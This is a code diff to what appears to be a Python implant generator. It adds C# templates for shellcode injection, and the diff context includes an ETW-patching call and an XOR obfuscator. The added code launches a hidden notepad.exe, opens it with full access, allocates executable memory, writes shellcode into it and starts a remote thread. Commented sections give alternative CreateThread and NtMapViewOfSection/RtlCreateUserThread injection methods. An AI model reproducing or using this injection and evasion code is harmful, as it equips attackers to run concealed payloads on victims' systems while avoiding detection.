@@ -97,6 +97,85 @@ SC_XOR_DECODER = """
 
 ETW_PATCH = "PatchEtw(getETWPayload());"
 
+
+START_PROCESS_INJECT_IMPORT = """
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+    [DllImport("kernel32.dll")]
+    static extern bool WriteProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+"""
+
+START_PROCESS_INJECT = """
+          ProcessStartInfo start = new ProcessStartInfo();
+          start.Arguments = ""; 
+          start.FileName = "notepad.exe";
+          start.WindowStyle = ProcessWindowStyle.Hidden;
+          start.CreateNoWindow = true;
+          int exitCode;
+          // Run the external process & wait for it to finish
+          using (Process proc = Process.Start(start))
+          {{
+            Process[] expProc = Process.GetProcessesByName("notepad");
+            for (int i = 0; i < expProc.Length; i++) {{
+              IntPtr hProcess = OpenProcess(0x001F0FFF, false, expProc[i].Id);
+              IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+              IntPtr outSize;
+              WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
+              IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            }}
+               proc.WaitForExit();
+               // Retrieve the app's exit code
+               exitCode = proc.ExitCode;
+          }}
+"""
+
+### OTHER IMPORTS
+## The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll can be used as alternatives to VirtualAllocEx and WriteProcessMemory.
+
+#        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+#        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+#
+#        [DllImport("kernel32.dll")]
+#        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+#
+#        [DllImport("kernel32.dll")]
+#        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+#        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
+#        static extern UInt32 NtCreateSection(
+#            ref IntPtr SectionHandle,
+#            UInt32 DesiredAccess,
+#            IntPtr ObjectAttributes,
+#            ref UInt32 MaximumSize,
+#            UInt32 SectionPageProtection,
+#            UInt32 AllocationAttributes,
+#            IntPtr FileHandle);
+#
+#        [DllImport("ntdll.dll", SetLastError=true)]
+#        static extern uint NtMapViewOfSection(
+#            IntPtr SectionHandle,
+#            IntPtr ProcessHandle,
+#            ref IntPtr BaseAddress,
+#            UIntPtr ZeroBits,
+#            UIntPtr CommitSize,
+#            out ulong SectionOffset,
+#            out uint ViewSize,
+#            uint InheritDisposition,
+#            uint AllocationType,
+#            uint Win32Protect);
+#
+#        [DllImport("ntdll.dll", SetLastError=true)]
+#        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
+#
+#        [DllImport("ntdll.dll", ExactSpelling=true, SetLastError=false)]
+#        static extern int NtClose(IntPtr hObject);
+
+
 class Obfuscator:
   def __init__(self, string, xor_key=b'\00'):
     self.raw = string
@@ -139,3 +218,32 @@ class Implant:
 
   def compile(self):
     pass
+
+
+# Other injection types
+#          //  IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+#          //  Marshal.Copy(buf, 0, addr, buf.Length);
+#          //  IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+#          //  WaitForSingleObject(hThread, 0xFFFFFFFF);
+#
+#
+#          //SIZE_T size = 4096;
+#          //LARGE_INTEGER sectionSize = {{ size }};
+#          //HANDLE sectionHandle = NULL;
+#          //PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
+#          //
+#          //// create a memory section
+#          //NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+#          //
+#          //// create a view of the memory section in the local process
+#          //NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
+#
+#          //// create a view of the memory section in the target process
+#          //HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, 1480);
+#          //NtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
+#
+#          //// copy shellcode to the local view, which will get reflected in the target process's mapped view
+#          //memcpy(localSectionAddress, buf, sizeof(buf));
+#          //
+#          //HANDLE targetThreadHandle = NULL;
+#          //RtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
